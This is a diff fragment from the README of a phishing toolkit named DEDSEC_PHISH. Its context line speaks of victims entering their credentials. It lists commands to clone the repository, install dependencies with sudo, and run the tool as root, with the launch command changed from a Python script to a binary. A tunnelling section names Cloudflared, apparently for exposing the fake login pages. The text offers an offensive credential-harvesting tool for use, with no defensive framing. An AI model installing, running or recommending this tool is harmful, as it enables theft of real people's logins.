@@ -12,7 +12,7 @@ When a victim enters their credentials, you should access the original website a
 * git clone https://github.com/0xbitx/DEDSEC_PHISH.git
 * cd DEDSEC_PHISH
 * sudo pip3 install pystyle tabulate pycryptodome
-* sudo python3 dedsec_phish.py
+* sudo ./dedsec_phish
 
 ### TUNNELLING
 * CLOUDFLARED
